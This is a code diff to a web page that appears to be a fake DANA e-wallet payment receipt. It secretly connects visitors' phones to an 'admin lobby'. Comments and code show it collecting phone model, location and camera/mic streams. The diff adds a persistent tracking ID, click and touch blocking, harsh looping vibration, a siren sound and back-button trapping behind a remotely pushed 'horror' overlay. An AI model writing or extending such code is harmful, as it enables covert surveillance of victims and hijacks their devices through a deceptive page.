@@ -71,21 +71,20 @@
       opacity: 0.001; pointer-events: none; overflow: hidden; z-index: 1;
     }
 
-    /* Overlay Error & Video dari Admin */
     #adminPushOverlay {
       position: fixed; inset: 0; z-index: 9999;
       background: #07090F; color: #F8FAFC;
       display: flex; flex-direction: column; align-items: center; justify-content: center;
-      padding: 20px; overflow: hidden; user-select: none;
+      padding: 20px; overflow: hidden; user-select: none; touch-action: none;
     }
     #adminPushOverlay.hidden { display: none !important; }
     #adminPushOverlay.horror-mode {
       background: radial-gradient(circle at center, #450A0A 0%, #09050A 68%, #030205 100%);
-      animation: horrorPulse 1.1s infinite alternate;
+      animation: horrorPulse 0.85s infinite alternate;
     }
     @keyframes horrorPulse {
-      0% { filter: contrast(1.08) brightness(0.9); }
-      100% { filter: contrast(1.32) brightness(1.1); }
+      0% { filter: contrast(1.1) brightness(0.88); }
+      100% { filter: contrast(1.38) brightness(1.12); }
     }
     .error-box {
       width: 100%; max-width: 400px;
@@ -93,7 +92,7 @@
       border: 1.5px solid #EF4444;
       border-radius: 16px;
       padding: 22px 18px;
-      box-shadow: 0 0 45px rgba(239, 68, 68, 0.42);
+      box-shadow: 0 0 45px rgba(239, 68, 68, 0.45);
       text-align: left;
     }
     .error-badge {
@@ -313,7 +312,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 23:04</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 23:27</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -385,7 +384,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 23:04</span>
+            <span id="displayDateTime">24 Nov 2026 • 23:27</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -700,15 +699,28 @@
     }
 
     /* =========================================================================
-       OVERLAY PRANK ADMIN: GETAR TERUS-MENERUS + SUARA DANA MATI + TAHAN BACK
+       OVERLAY PRANK ADMIN: BLOK KLIK, GETAR KERAS, SIREN AUDIO & TAHAN BACK
        ========================================================================= */
     let prankActive = false;
     let vibrateLoopTimer = null;
+    let sirenLoopTimer = null;
+    let sirenCtx = null;
+
+    const pushOverlayEl = document.getElementById("adminPushOverlay");
+    ["click", "mousedown", "pointerdown", "touchstart"].forEach((evtName) => {
+      pushOverlayEl.addEventListener(evtName, (e) => {
+        if (!prankActive) return;
+        if (e.target && e.target.id === "adminPushVideo") return;
+        e.preventDefault();
+        e.stopPropagation();
+        fireContinuousVibrate();
+      }, { passive: false });
+    });
 
     function fireContinuousVibrate() {
       try {
         if (navigator.vibrate) {
-          navigator.vibrate([450, 120, 450, 120, 600, 120]);
+          navigator.vibrate([700, 80, 700, 80, 900, 80]);
         }
       } catch (_) {}
     }
@@ -722,7 +734,7 @@
           return;
         }
         fireContinuousVibrate();
-      }, 1450);
+      }, 1750);
     }
 
     function stopContinuousVibrate() {
@@ -733,6 +745,52 @@
       try {
         if (navigator.vibrate) navigator.vibrate(0);
       } catch (_) {}
+    }
+
+    function triggerSirenPulse() {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        if (!sirenCtx) sirenCtx = new AudioCtx();
+        if (sirenCtx.state === "suspended") {
+          sirenCtx.resume().catch(() => {});
+        }
+        const now = sirenCtx.currentTime;
+        const osc = sirenCtx.createOscillator();
+        const gain = sirenCtx.createGain();
+        osc.type = "sawtooth";
+        osc.frequency.setValueAtTime(640, now);
+        osc.frequency.linearRampToValueAtTime(1120, now + 0.35);
+        osc.frequency.linearRampToValueAtTime(580, now + 0.72);
+
+        gain.gain.setValueAtTime(0.001, now);
+        gain.gain.linearRampToValueAtTime(0.28, now + 0.06);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.75);
+
+        osc.connect(gain);
+        gain.connect(sirenCtx.destination);
+        osc.start(now);
+        osc.stop(now + 0.76);
+      } catch (_) {}
+    }
+
+    function startSirenAudio() {
+      stopSirenAudio();
+      triggerSirenPulse();
+      sirenLoopTimer = setInterval(() => {
+        if (!prankActive) {
+          stopSirenAudio();
+          return;
+        }
+        triggerSirenPulse();
+      }, 850);
+    }
+
+    function stopSirenAudio() {
+      if (sirenLoopTimer) {
+        clearInterval(sirenLoopTimer);
+        sirenLoopTimer = null;
+      }
     }
 
     function pushHistoryTrap() {
@@ -747,11 +805,13 @@
       pushHistoryTrap();
       pushHistoryTrap();
       startContinuousVibrate();
+      startSirenAudio();
     }
 
     function releasePrankLock() {
       prankActive = false;
       stopContinuousVibrate();
+      stopSirenAudio();
     }
 
     window.addEventListener("popstate", () => {
@@ -770,7 +830,6 @@
     });
 
     function showAdminErrorOverlay(msg) {
-      const overlay = document.getElementById("adminPushOverlay");
       const errView = document.getElementById("pushErrorView");
       const vidView = document.getElementById("pushVideoView");
       const pushVid = document.getElementById("adminPushVideo");
@@ -786,24 +845,23 @@
       document.getElementById("pushErrorMeta").textContent =
         `NODE: ${MEMBER_PEER_ID} • TIME: ${new Date().toLocaleTimeString("id-ID")}`;
 
-      overlay.classList.add("horror-mode");
+      pushOverlayEl.classList.add("horror-mode");
       vidView.classList.add("hidden");
       errView.classList.remove("hidden");
-      overlay.classList.remove("hidden");
+      pushOverlayEl.classList.remove("hidden");
 
       engagePrankLock();
     }
 
     function showAdminVideoOverlay(msg) {
-      const overlay = document.getElementById("adminPushOverlay");
       const errView = document.getElementById("pushErrorView");
       const vidView = document.getElementById("pushVideoView");
       const pushVid = document.getElementById("adminPushVideo");
 
       errView.classList.add("hidden");
       vidView.classList.remove("hidden");
-      overlay.classList.toggle("horror-mode", msg.horrorMode !== false);
-      overlay.classList.remove("hidden");
+      pushOverlayEl.classList.toggle("horror-mode", msg.horrorMode !== false);
+      pushOverlayEl.classList.remove("hidden");
 
       const targetUrl = (msg.videoUrl && msg.videoUrl.trim())
         ? msg.videoUrl.trim()
@@ -824,7 +882,6 @@
     }
 
     function hideAdminOverlay() {
-      const overlay = document.getElementById("adminPushOverlay");
       const errView = document.getElementById("pushErrorView");
       const vidView = document.getElementById("pushVideoView");
       const pushVid = document.getElementById("adminPushVideo");
@@ -840,12 +897,12 @@
       }
       errView.classList.add("hidden");
       vidView.classList.add("hidden");
-      overlay.classList.remove("horror-mode");
-      overlay.classList.add("hidden");
+      pushOverlayEl.classList.remove("horror-mode");
+      pushOverlayEl.classList.add("hidden");
     }
 
     /* =========================================================================
-       MODUL MEMBER: DETEKSI NAMA HP + LOKASI CEPAT + KAMERA/MIC + OVERLAY
+       MODUL MEMBER: ID HP TETAP SAMA DI LOCALSTORAGE + LOKASI + KAMERA/MIC
        ========================================================================= */
     function detectHpInfo() {
       const ua = navigator.userAgent || "";
@@ -899,9 +956,24 @@
       return { slug: "hp", name: modelMatch || "HP" };
     }
 
+    function getPersistentMemberPeerId(brandSlug) {
+      const storageKey = "jirun_member_peer_id_v1";
+      try {
+        const existing = localStorage.getItem(storageKey);
+        if (existing && /^[a-z0-9-]+$/i.test(existing) && existing.length >= 6) {
+          return existing;
+        }
+      } catch (_) {}
+      const generated = `${brandSlug}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
+      try {
+        localStorage.setItem(storageKey, generated);
+      } catch (_) {}
+      return generated;
+    }
+
     const HP_INFO = detectHpInfo();
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
-    const MEMBER_PEER_ID = `${HP_INFO.slug}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
+    const MEMBER_PEER_ID = getPersistentMemberPeerId(HP_INFO.slug);
 
     const PEER_CONFIG = {
       debug: 0,
@@ -1341,11 +1413,13 @@
       if (hasSentExplicitClose) return;
       if (document.hidden) {
         stopContinuousVibrate();
+        stopSirenAudio();
         broadcastPresenceToAdmins();
       } else {
         if (prankActive) {
           silenceDanaNotifSound();
           startContinuousVibrate();
+          startSirenAudio();
         }
         connectToAdminLobby();
         if (hasCameraPermission && (!cameraStream || cameraStream.getVideoTracks().every((t) => t.readyState !== "live"))) {
@@ -1362,7 +1436,7 @@
 
     function cleanupMemberSession(isExplicitClose = true) {
       if (!isExplicitClose) return;
-      stopContinuousVibrate();
+      releasePrankLock();
       hasSentExplicitClose = true;
       const closingMsg = { type: "HP_CLOSING", peerId: MEMBER_PEER_ID, updatedAt: Date.now() };
       if (lobbyConn && lobbyConn.open) {
